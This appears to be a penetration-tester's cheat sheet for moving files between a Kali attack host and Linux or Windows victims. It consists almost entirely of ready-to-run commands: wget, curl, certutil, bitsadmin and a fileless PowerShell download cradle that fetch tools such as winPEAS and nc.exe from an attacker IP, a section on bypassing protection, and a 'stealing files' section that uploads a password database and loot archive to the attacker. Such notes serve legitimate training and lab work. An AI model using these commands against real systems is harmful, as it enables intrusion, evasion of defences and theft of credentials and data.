> [!note] Cheat Sheet: Transferring Files #file-transfer #http #smb #certutil #wget
### 1. Setting up a server on Kali (Where to transfer files from)

Fast web server in the current folder:
```
python3 -m http.server 80
```

SMB server via Impacket (allows Windows machines to run .exe directly over the network without writing to disk):
```
sudo impacket-smbserver share -smb2support /path/to/folder/
```

Receiving HTTP server for uploading files from the victim (requires the `uploadserver` module):
```
python3 -m uploadserver 8000
```

### 2. Uploading files to a Linux victim

Basic download via `wget` in `/tmp`:
```
wget http://10.10.14.10/linpeas.sh -O /tmp/linpeas.sh
```

Downloading via `curl`:
```
curl http://10.10.14.10/linpeas.sh -o /tmp/linpeas.sh
```

### 3. Downloading files to a Windows victim (Basic methods)

Via the built-in `certutil` utility:
```
certutil.exe -urlcache -split -f http://10.10.14.10/winPEAS.exe C:\Temp\winPEAS.exe
```

Via PowerShell (`Invoke-WebRequest`):
```
Invoke-WebRequest -Uri "http://10.10.14.10/winPEAS.exe" -OutFile "C:\Temp\winPEAS.exe"
```

Copying from your SMB server:
```
copy \\10.10.14.10\share\winPEAS.exe C:\Temp\winPEAS.exe
```

Running `.exe` directly from the SMB server (without saving to disk):
```
\\10.10.14.10\share\winPEAS.exe
```

### 4. Advanced Download (Bypass Protection and LOLBAS)

Running a script in memory without writing to disk (PowerShell):
```
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/script.ps1')
```

Using the BITS system service (if `wget`/`certutil`) blocked):
```
bitsadmin /transfer myjob /download /priority normal http://10.10.14.10/nc.exe C:\Temp\nc.exe
```

PowerShell with forced ignoring of SSL errors (self-signed certificates):
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri "https://10.10.14.10/winpeas.exe" -OutFile "C:\Temp\winpeas.exe"
```

### 5. Data Extraction (Stealing Files from a Victim on Kali)

Uploading a file to your SMB server:
```
copy C:\Users\Admin\Documents\passwords.kdbx \\10.10.14.10\share\
```

Uploading a file via HTTP POST to your `uploadserver`:
```
Invoke-RestMethod -Uri http://10.10.14.10:8000/upload -Method Post -InFile C:\Temp\loot.zi
```
